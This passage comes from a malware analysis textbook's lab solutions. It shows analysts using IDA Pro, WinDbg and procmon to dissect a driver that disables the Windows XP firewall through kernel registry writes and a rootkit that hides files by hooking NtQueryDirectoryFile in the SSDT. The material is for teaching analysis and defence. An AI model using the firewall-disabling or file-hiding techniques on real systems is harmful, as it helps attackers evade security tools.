- en: '**Applying a Structure in IDA Pro**'
  prefs: []
  type: TYPE_NORMAL
- en: The AT_INFO structure can be applied to the data in *DLL3.dll*. First, load
    *DLL3.dll* into IDA Pro, press the INSERT key within the Structures window, and
    add the standard structure AT_INFO. Next, go to dword_1000B0A0 in memory and Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**547**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: select **Edit****Struct Var** and click **AT_INFO**. This will cause the data
    to be more readable, as shown in Listing 9-11L. We can see that the scheduled
    job will be set to ping *malwareanalysisbook.com* every day of the week at 1:00
    AM.
  prefs: []
  type: TYPE_NORMAL
- en: 10001022 mov stru_1000B0A0.Command, offset WideCharStr ; "ping www..."
  prefs: []
  type: TYPE_NORMAL
- en: 1000102C mov stru_1000B0A0.JobTime, 36EE80h
  prefs: []
  type: TYPE_NORMAL
- en: 10001036 mov stru_1000B0A0.DaysOfMonth, 0
  prefs: []
  type: TYPE_NORMAL
- en: 10001040 mov stru_1000B0A0.DaysOfWeek, 7Fh
  prefs: []
  type: TYPE_NORMAL
- en: 10001047 mov stru_1000B0A0.Flags, 11h
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-11L: AT_INFO Structure*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Specifying a New Image Base with IDA Pro**'
  prefs: []
  type: TYPE_NORMAL
- en: We can load *DLL2.dll* into IDA Pro in a different location by checking the
    **Manual Load** box when loading the DLL. In the field that says **Please specify**
    **the new image base**, we type **320000**. IDA Pro will do the rest to adjust
    all of the offsets, just as OllyDbg did when loading the DLL.
  prefs: []
  type: TYPE_NORMAL
- en: '**Malware Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: 'This lab demonstrated how to determine where three DLLs are loaded into *Lab09-03.exe*
    using OllyDbg. We loaded these DLLs into IDA Pro to perform full analysis, and
    then figured out the mystery data printed by the malware: mystery data 1 is the
    current process identifier, mystery data 2 is the handle to the open *temp.txt*,
    and mystery data 3 is the location in memory of the string ping www.malwareanalysisbook.com.
    Finally, we applied the Windows AT_INFO structure within IDA Pro to aid our analysis
    of *DLL3.dll*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 10-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: If you run procmon to monitor this program, you will see that the only call
    to write to the registry is to RegSetValue for the value HKLM\SOFTWARE\ Microsoft\Cryptography\RNG\Seed.
    Some indirect changes are made by the calls to CreateServiceA, but this program
    also makes direct changes to the registry from the kernel that go undetected by
    procmon.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: To set a breakpoint to see what happens in the kernel, you must open the executable
    within an instance of WinDbg running in the virtual machine, while also debugging
    the kernel with another instance of WinDbg in the host machine. When *Lab10-01.exe*
    is stopped in the virtual machine, you first use the !drvobj command to get a
    handle to the driver object, which contains a pointer to the unload function.
    Next, you can set a breakpoint on the unload function within the driver. The breakpoint
    will be triggered when you restart *Lab10-01.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: This program creates a service to load a driver. The driver code then creates
    (or modifies, if they exist) the registry keys \Registry\Machine\ SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
    and **548**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile.
  prefs: []
  type: TYPE_NORMAL
- en: Setting these registry keys disables the Windows XP firewall.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin with some basic static analysis. Examining the executable, we see very
    few imports other than the standard ones included with every executable. The imports
    of interest are OpenSCManagerA, OpenServiceA, ControlService, StartServiceA, and
    CreateServiceA. These indicate the program creates a service, and probably starts
    and manipulates that service. There appears to be little additional interaction
    with the system.
  prefs: []
  type: TYPE_NORMAL
- en: The strings output reveals a few interesting strings. The first is C:\Windows\
    System32\Lab10-01.sys, which suggests that *Lab10-01.sys* probably contains the
    code for the service.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the driver file, we see that it imports only three functions.
  prefs: []
  type: TYPE_NORMAL
- en: The first function is KeTickCount, which is included in almost every driver
    and can be ignored. The two remaining functions, RtlCreateRegistryKey and RtlWriteRegistryValue,
    tell us that the driver probably accesses the registry.
  prefs: []
  type: TYPE_NORMAL
- en: '**10**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The driver file also contains a number of interesting strings, as follows:
    EnableFirewall'
  prefs: []
  type: TYPE_NORMAL
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
  prefs: []
  type: TYPE_NORMAL
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile
  prefs: []
  type: TYPE_NORMAL
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft\WindowsFirewall
  prefs: []
  type: TYPE_NORMAL
- en: \Registry\Machine\SOFTWARE\Policies\Microsoft
  prefs: []
  type: TYPE_NORMAL
- en: These strings look a lot like registry keys, except that they start with
  prefs: []
  type: TYPE_NORMAL
- en: \Registry\Machine, instead of one of the usual registry root keys, such as HKLM.
  prefs: []
  type: TYPE_NORMAL
- en: When accessing the registry from the kernel, the prefix \Registry\Machine is
    equivalent to accessing HKEY_LOCAL_MACHINE from a user-space program. An Internet
    search reveals that setting the EnableFirewall value to 0 disables the built-in
    Windows XP firewall.
  prefs: []
  type: TYPE_NORMAL
- en: 'Since these strings suggest that the malware writes to the registry, we open
    procmon to test our hypothesis. This shows several calls to functions that read
    the registry, but only one call to write to the registry: RegSetValue on the value
    HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed. This registry value is changed
    all the time and is meaningless for malware analysis, but since kernel code is
    involved, we need to make sure that the driver isn’t modifying the registry covertly.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we open the executable, navigate to the main function shown in Listing
    10-1L, and see that it makes only four function calls.
  prefs: []
  type: TYPE_NORMAL
- en: 00401004 push 0F003Fh ; dwDesiredAccess
  prefs: []
  type: TYPE_NORMAL
- en: 00401009 push 0 ; lpDatabaseName
  prefs: []
  type: TYPE_NORMAL
- en: 0040100B push 0 ; lpMachineName
  prefs: []
  type: TYPE_NORMAL
- en: 0040100D call ds:OpenSCManagerA ; Establish a connection to the service 0040100D
  prefs: []
  type: TYPE_NORMAL
- en: ; control manager on the specified computer
  prefs: []
  type: TYPE_NORMAL
- en: 0040100D
  prefs: []
  type: TYPE_NORMAL
- en: ; and opens the specified database
  prefs: []
  type: TYPE_NORMAL
- en: 00401013 mov edi, eax
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**549**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401015 test edi, edi
  prefs: []
  type: TYPE_NORMAL
- en: 00401017 jnz short loc_401020
  prefs: []
  type: TYPE_NORMAL
- en: 00401019 pop edi
  prefs: []
  type: TYPE_NORMAL
- en: 0040101A add esp, 1Ch
  prefs: []
  type: TYPE_NORMAL
- en: 0040101D retn 10h
  prefs: []
  type: TYPE_NORMAL
- en: '00401020 loc_401020:'
  prefs: []
  type: TYPE_NORMAL
- en: 00401020 push esi
  prefs: []
  type: TYPE_NORMAL
- en: 00401021 push 0 ; lpPassword
  prefs: []
  type: TYPE_NORMAL
- en: 00401023 push 0 ; lpServiceStartName
  prefs: []
  type: TYPE_NORMAL
- en: 00401025 push 0 ; lpDependencies
  prefs: []
  type: TYPE_NORMAL
- en: 00401027 push 0 ; lpdwTagId
  prefs: []
  type: TYPE_NORMAL
- en: 00401029 push 0 ; lpLoadOrderGroup
  prefs: []
  type: TYPE_NORMAL
- en: 0040102B push offset BinaryPathName ; "C:\\Windows\\System32\\Lab10-01.sys"
  prefs: []
  type: TYPE_NORMAL
- en: 00401030 push 1 ; dwErrorControl
  prefs: []
  type: TYPE_NORMAL
- en: 00401032 push 3 ; dwStartType
  prefs: []
  type: TYPE_NORMAL
- en: 00401034 push 1 ; dwServiceType
  prefs: []
  type: TYPE_NORMAL
- en: 00401036 push 0F01FFh ; dwDesiredAccess
  prefs: []
  type: TYPE_NORMAL
- en: 0040103B push offset ServiceName ; "Lab10-01"
  prefs: []
  type: TYPE_NORMAL
- en: 00401040 push offset ServiceName ; "Lab10-01"
  prefs: []
  type: TYPE_NORMAL
- en: 00401045 push edi ; hSCManager
  prefs: []
  type: TYPE_NORMAL
- en: 00401046 call ds:CreateServiceA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-1L: main method of* Lab10-01.exe'
  prefs: []
  type: TYPE_NORMAL
- en: First, it calls OpenSCManagerA at  to get a handle to the service manager,
    and then it calls CreateServiceA at  to create a service called Lab10-01\. The
    call to CreateServiceA tells us that the service will use code in *C:\Windows\System32\*
    *Lab10-01.sys* at  and that the service type is 3 at , or SERVICE_KERNEL_DRIVER,
    which means that this file will be loaded into the kernel.
  prefs: []
  type: TYPE_NORMAL
- en: If the call to CreateServiceA fails, the code calls OpenServiceA with the same
    service name, as shown in Listing 10-2L at . This opens a handle to the Lab10-01
    service if the CreateServiceA call failed because the service already existed.
  prefs: []
  type: TYPE_NORMAL
- en: 00401052 push 0F01FFh
  prefs: []
  type: TYPE_NORMAL
- en: ; dwDesiredAccess
  prefs: []
  type: TYPE_NORMAL
- en: 00401057 push offset ServiceName ; "Lab10-01"
  prefs: []
  type: TYPE_NORMAL
- en: 0040105C push edi
  prefs: []
  type: TYPE_NORMAL
- en: ; hSCManager
  prefs: []
  type: TYPE_NORMAL
- en: 0040105D call ds:OpenServiceA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-2L: Call to OpenServiceA to get a handle to the service for Lab10-01*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the program calls StartServiceA to start the service, as shown in Listing
    10-3L at . Finally, it calls ControlService at . The second parameter to ControlService
    is what type of control message is being sent. In this case, the value is 0x01
    at , which we look up in the documentation and find that it means SERVICE_CONTROL_STOP.
    This will unload the driver and call the driver’s unload function.
  prefs: []
  type: TYPE_NORMAL
- en: 00401069 push 0 ; lpServiceArgVectors 0040106B push 0 ; dwNumServiceArgs
  prefs: []
  type: TYPE_NORMAL
- en: 0040106D push esi ; hService
  prefs: []
  type: TYPE_NORMAL
- en: 0040106E call ds:StartServiceA
  prefs: []
  type: TYPE_NORMAL
- en: '**550**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401074 test esi, esi
  prefs: []
  type: TYPE_NORMAL
- en: 00401076 jz short loc_401086
  prefs: []
  type: TYPE_NORMAL
- en: 00401078 lea eax, [esp+24h+ServiceStatus]
  prefs: []
  type: TYPE_NORMAL
- en: 0040107C push eax ; lpServiceStatus
  prefs: []
  type: TYPE_NORMAL
- en: 0040107D push 1 ; dwControl
  prefs: []
  type: TYPE_NORMAL
- en: 0040107F push esi ; hService
  prefs: []
  type: TYPE_NORMAL
- en: '00401080 call ds:ControlService ; Send a control code to a Win32 service *Listing
    10-3L: Call to ControlService from* Lab10-01.exe **Viewing Lab10-01.sys in IDA
    Pro**'
  prefs: []
  type: TYPE_NORMAL
- en: Before we try to analyze the driver with WinDbg, we can open the driver in IDA
    Pro to examine the DriverEntry function. When we first open the driver and navigate
    to the entry point, we see the code in Listing 10-4L.
  prefs: []
  type: TYPE_NORMAL
- en: 00010959 mov edi, edi
  prefs: []
  type: TYPE_NORMAL
- en: 0001095B push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 0001095C mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 0001095E call sub_10920
  prefs: []
  type: TYPE_NORMAL
- en: '**10**'
  prefs: []
  type: TYPE_NORMAL
- en: 00010963 pop ebp
  prefs: []
  type: TYPE_NORMAL
- en: 00010964 jmp sub_10906
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-4L: Code at the entry point of* Lab10-01.sys This function is the
    entry point of the driver, but it’s not the DriverEntry function. The compiler
    inserts wrapper code around the DriverEntry. The real DriverEntry function is
    located at sub_10906 .'
  prefs: []
  type: TYPE_NORMAL
- en: As shown in Listing 10-5L, the main body of the DriverEntry function appears
    to move an offset value into a memory location, but otherwise it doesn’t make
    any function calls or interact with the system.
  prefs: []
  type: TYPE_NORMAL
- en: 00010906 mov edi, edi
  prefs: []
  type: TYPE_NORMAL
- en: 00010908 push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 00010909 mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 0001090B mov eax, [ebp+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 0001090E mov dword ptr [eax+34h], offset loc_10486
  prefs: []
  type: TYPE_NORMAL
- en: 00010915 xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00010917 pop ebp
  prefs: []
  type: TYPE_NORMAL
- en: 00010918 retn 8
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-5L: The DriverEntry routine for* Lab10-01.sys **Analyzing Lab10-01.sys
    in WinDbg**'
  prefs: []
  type: TYPE_NORMAL
- en: Now, we can use WinDbg to examine *Lab10-01.sys* to see what happens when ControlService
    is called to unload *Lab10-01.sys*. The code in the user-space executable loads
    *Lab10-10.sys* and then immediately unloads it. If we use the kernel debugger
    before running the malicious executable, the driver will not yet be in memory,
    so we won’t be able to examine it. But if we wait until after the malicious executable
    is finished executing, the driver will already have been unloaded from memory.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**551**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'In order to analyze *Lab10-01.sys* with WinDbg while it is loaded in memory,
    we’ll load the executable into WinDbg within the virtual machine. We set a breakpoint
    between the time that the driver is loaded and unloaded, at the ControlService
    call, with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: 0:000> bp 00401080
  prefs: []
  type: TYPE_NORMAL
- en: 'Then we start the program and wait until the breakpoint is hit. When the breakpoint
    is hit, we are presented with the following information in WinDbg: Breakpoint
    0 hit'
  prefs: []
  type: TYPE_NORMAL
- en: eax=0012ff1c ebx=7ffdc000 ecx=77defb6d edx=00000000 esi=00144048 edi=00144f58
  prefs: []
  type: TYPE_NORMAL
- en: eip=00401080 esp=0012ff08 ebp=0012ffc0 iopl=0 nv up ei pl nz na pe nc cs=001b
    ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
  prefs: []
  type: TYPE_NORMAL
- en: 'image00400000+0x1080:'
  prefs: []
  type: TYPE_NORMAL
- en: Once the program is stopped at the breakpoint, we move out of the virtual machine
    in order to connect the kernel debugger and get information about *Lab10-01.sys*.
    We open another instance of WinDbg and select **File**
  prefs: []
  type: TYPE_NORMAL
- en: '**Kernel Debug** with pipe set to *\\.\pipe\com_1* and a baud rate of 115200
    to connect the instance of WinDbg running in the host machine to the kernel of
    the guest machine. We know that our service is called Lab10-01, so we can get
    a driver object by using the !drvobj command, as shown in Listing 10-6L.'
  prefs: []
  type: TYPE_NORMAL
- en: kd> !drvobj lab10-01
  prefs: []
  type: TYPE_NORMAL
- en: 'Driver object  (8263b418) is for:'
  prefs: []
  type: TYPE_NORMAL
- en: Loading symbols for f7c47000 Lab10-01.sys -> Lab10-01.sys
  prefs: []
  type: TYPE_NORMAL
- en: '*** ERROR: Module load completed but symbols could not be loaded for Lab10-01.sys'
  prefs: []
  type: TYPE_NORMAL
- en: \Driver\Lab10-01
  prefs: []
  type: TYPE_NORMAL
- en: 'Driver Extension List: (id , addr)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Device Object list: '
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-6L: Locating the device object for Lab10-01*'
  prefs: []
  type: TYPE_NORMAL
- en: The output of the !drvobj command gives us the address of the driver object
    at . Because there are no devices listed in the device object list at , we know
    that this driver does not have any devices that are accessible by user-space applications.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*To resolve any difficulty locating the service name, you can get a list of
    driver objects* *currently in the kernel with the !object \Driver command.*'
  prefs: []
  type: TYPE_NORMAL
- en: Once we have the address of the driver object, we can view it using the dt command,
    as shown in Listing 10-7L.
  prefs: []
  type: TYPE_NORMAL
- en: kd> **dt _DRIVER_OBJECT 8263b418**
  prefs: []
  type: TYPE_NORMAL
- en: nt!_DRIVER_OBJECT
  prefs: []
  type: TYPE_NORMAL
- en: '+0x000 Type : 4'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x002 Size : 168'
  prefs: []
  type: TYPE_NORMAL
- en: '**552**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x004 DeviceObject : (null)'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x008 Flags : 0x12'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x00c DriverStart : 0xf7c47000'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x010 DriverSize : 0xe80'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x014 DriverSection : 0x826b2c88'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x018 DriverExtension : 0x8263b4c0 _DRIVER_EXTENSION'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x01c DriverName : _UNICODE_STRING "\Driver\Lab10-01"'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x024 HardwareDatabase : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\ HARDWARE\DESCRIPTION\SYSTEM"'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x028 FastIoDispatch : (null)'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x02c DriverInit : 0xf7c47959 long +0'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x030 DriverStartIo : (null)'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x034 DriverUnload : 0xf7c47486 void +0'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x038 MajorFunction : [28] 0x804f354a long nt!IopInvalidDeviceRequest+0'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-7L: Viewing the driver object for* Lab10-01.sys *in WinDbg* We’re
    trying to identify the function called when the driver is unloaded—'
  prefs: []
  type: TYPE_NORMAL
- en: 'information at offset 0x034, DriverUnload, as shown at . Then we set a breakpoint
    using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '**10**'
  prefs: []
  type: TYPE_NORMAL
- en: kd> **bp 0xf7c47486**
  prefs: []
  type: TYPE_NORMAL
- en: Having set the breakpoint, we resume running our kernel. Then we return to the
    version of WinDbg running on the executable on our virtual machine and resume
    it as well. Immediately, the entire guest OS freezes because the kernel debugger
    has hit our kernel breakpoint. At this point, we can go to the kernel debugger
    to step through the code. We see that the program calls the RtlCreateRegistryKey
    function three times to create several registry keys, and then calls the RtlWriteRegistryValue
    twice to set the EnableFirewall value to 0 in two places. This disables the Windows
    XP firewall from the kernel in a way that is difficult for security programs to
    detect.
  prefs: []
  type: TYPE_NORMAL
- en: 'If the unload function at 0xf7c47486 were long or complex, it would have been
    difficult to analyze in WinDbg. In many cases, it’s easier to analyze a function
    in IDA Pro once you have identified where the function is located, because IDA
    Pro does a better job of analyzing the functions. However, the function location
    in WinDbg is different than the function location in IDA Pro, so we must perform
    some manual calculations in order to view the function in IDA Pro. We must calculate
    the offset of the function from the beginning of the file as it is loaded in WinDbg
    using the lm command, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: kd> **lm**
  prefs: []
  type: TYPE_NORMAL
- en: start
  prefs: []
  type: TYPE_NORMAL
- en: end module name
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: f7c47000 f7c47e80 Lab10_01 (no symbols)
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, the file is loaded at 0xf7c47000 at , and from earlier, we
    know the unload function is located at 0xf7c47486\. We subtract 0xf7c47000
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**553**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: from 0xf7c47486 to get the offset (0x486), which we then use to navigate to
    the unload function in IDA Pro. For example, if the base load address in IDA Pro
    is 0x00100000, then we navigate to address 0x00100486 to find the unload function
    in IDA Pro. We can then use static analysis and IDA Pro to confirm what we discovered
    in WinDbg.
  prefs: []
  type: TYPE_NORMAL
- en: Alternatively, we can change the base address in IDA Pro by selecting EditSegmentsRebase
    Program and changing the base address value from 0x00100000 to 0xf7c47000\.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*If you tried to use a deferred breakpoint using the bu $iment(Lab10-01), you
    may have* *run into trouble because WinDbg changes hyphens to underscores when
    it encounters* *them in filenames. The correct command to break on the entry point
    of the driver in this* *lab would be bu $iment(Lab10_01). This behavior is not
    documented anywhere and* *may be inconsistent across versions of WinDbg.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 10-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The program creates the file *C:\Windows\System32\Mlwx486.sys*. You can use
    procmon or another dynamic monitoring tool to see the file being created, but
    you cannot see the file on disk because it is hidden.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The program has a kernel component. It is stored in the file’s resource section,
    and then written to disk and loaded into the kernel as a service.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The program is a rootkit designed to hide files. It uses SSDT hooking to overwrite
    the entry to NtQueryDirectoryFile, which it uses to prevent the display of any
    files beginning with *Mlwx* (case-sensitive) in directory listings.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the imports section of this executable, we see imports for CloseServiceHandle,
    CreateServiceA, OpenSCManagerA, and StartServiceA, which tell us that this program
    will create and start a service. Because the program also calls CreateFile and
    WriteFile, we know that it will write to a file at some point. We also see calls
    to LoadResource and SizeOfResource, which tell us that this program will do something
    with the resource section of *Lab10-02.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: Recognizing that the program accesses the resource section, we use Resource
    Hacker to examine the resource section. There, we see that the file contains another
    PE header within the resource section, as shown in Figure 10-1L. This is probably
    another file of malicious code that *Lab10-02.exe* will use.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we run the program and find that it creates a file and a service.
  prefs: []
  type: TYPE_NORMAL
- en: Using procmon, we see that the program creates a file in *C:\Windows\System32*,
    and that it creates a service that uses that file as the executable. That file
    contains the kernel code that will be loaded by the OS.
  prefs: []
  type: TYPE_NORMAL
- en: We should next find the file that the program creates in order to analyze it
    and determine what the kernel code is doing. However, when we look in **554**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 124](index-588_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*C:\Windows\System32*, we find that there’s nothing there. We can see in procmon
    that the file is created, and there are no calls that would delete the file.'
  prefs: []
  type: TYPE_NORMAL
- en: Based on the facts that the file doesn’t appear but we don’t see how it was
    deleted and that a driver is involved, we should be suspicious that we’re dealing
    with a rootkit.
  prefs: []
  type: TYPE_NORMAL
- en: '**10**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-1L: An executable file stored in the resource section of* Lab10-02.exe
    **Finding the Rootkit**'
  prefs: []
  type: TYPE_NORMAL
- en: In order to continue investigating, we want to check to see if our kernel driver
    is loaded. To do that, we use the sc command to check on the status of the service
    that is running our kernel driver, as shown in Listing 10-8L.
  prefs: []
  type: TYPE_NORMAL
- en: C:\> **sc query "486 WS Driver"** 
  prefs: []
  type: TYPE_NORMAL
- en: 'SERVICE_NAME: 486 WS Driver'
  prefs: []
  type: TYPE_NORMAL
- en: 'TYPE :'
  prefs: []
  type: TYPE_NORMAL
- en: 1 KERNEL_DRIVER
  prefs: []
  type: TYPE_NORMAL
- en: 'STATE : 4 RUNNING'
  prefs: []
  type: TYPE_NORMAL
- en: (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
  prefs: []
  type: TYPE_NORMAL
- en: 'WIN32_EXIT_CODE : 0 (0x0)'
  prefs: []
  type: TYPE_NORMAL
- en: 'SERVICE_EXIT_CODE : 0 (0x0)'
  prefs: []
  type: TYPE_NORMAL
- en: 'CHECKPOINT : 0x0'
  prefs: []
  type: TYPE_NORMAL
- en: 'WAIT_HINT : 0x0'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-8L: Using the sc command to get information about a service* We
    query for the service name 486 WS Driver at , which was specified in the call
    to CreateServiceA. We see at  that the service is still running, which tells
    us that the kernel code is in memory. Something fishy is going on because the
    driver is still running, but it’s not on disk. Now, to determine what’s going
    on, we connect the kernel debugger to our virtual machine, and we check to see
    if the driver was actually loaded using the lm command. We see an entry that matches
    the filename that was created by *Lab10-02.exe*: f7c4d000 f7c4dd80 Mlwx486 (deferred)'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**555**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: We are now certain that the driver is loaded into memory with the filename *Mlwx486.sys*,
    but the file does not appear on disk, suggesting that this might be a rootkit.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we check the SSDT for any modified entries, as shown in Listing 10-9L.
  prefs: []
  type: TYPE_NORMAL
- en: kd> dd dwo(KeServiceDescriptorTable) L100
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 80501dbc 8060cb50 8060cb50 8053c02e 80606e68
  prefs: []
  type: TYPE_NORMAL
- en: 80501dcc 80607ac8 **f7c4d486** 805b3de0 8056f3ca
  prefs: []
  type: TYPE_NORMAL
- en: 80501ddc 806053a4 8056c222 8060c2dc 8056fc46
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-9L: An excerpt from the SSDT with one entry that has been modified
    by a rootkit* We see that the entry at  is in a memory location that is clearly
    outside the bounds of the ntoskrnl module but within the loaded *Mlwx486.sys*
    driver.'
  prefs: []
  type: TYPE_NORMAL
- en: To determine which normal function is being replaced, we revert our virtual
    machine to before the rootkit was installed to see which function was stored at
    the offset into the SSDT that was overwritten. In this case, the function is NtQueryDirectoryFile,
    which is a versatile function that retrieves information about files and directories
    used by FindFirstFile and FindNextFile to traverse directory structures. This
    function is also used by Windows Explorer to display files and directories. If
    the rootkit is hooking this function, it could be hiding files, which would explain
    why we can’t find *Mlwx486.sys*. Now that we’ve found a function that is hooking
    the SSDT, we must analyze what that function is doing.
  prefs: []
  type: TYPE_NORMAL
- en: '**Examining the Hook Function**'
  prefs: []
  type: TYPE_NORMAL
- en: We now look more closely at the function called instead of NtQueryDirectoryFile,
    which we’ll call PatchFunction. The malicious PatchFunction must work with the
    same interface as the original function, so we first check the documentation of
    the original function. We find that NtQueryDirectoryFile is technically undocumented
    according to Microsoft, but a quick Internet search will provide all the information
    we need. The NtQueryDirectoryFile function is a very flexible one with a lot of
    different parameters that determine what will be returned.
  prefs: []
  type: TYPE_NORMAL
- en: Now, we want to look at the malicious function to see what is being done with
    the requests. We set a breakpoint on PatchFunction and discover that the first
    thing it does is call the original NtQueryDirectoryFile with all of the original
    parameters, as shown in Listing 10-10L.
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d490 ff7530 push dword ptr [ebp+30h]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d493 ff752c push dword ptr [ebp+2Ch]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d496 ff7528 push dword ptr [ebp+28h]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d499 ff7524 push dword ptr [ebp+24h]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d49c ff7520 push dword ptr [ebp+20h]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d49f 56 push esi
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4a0 ff7518 push dword ptr [ebp+18h]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4a3 ff7514 push dword ptr [ebp+14h]
  prefs: []
  type: TYPE_NORMAL
- en: '**556**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
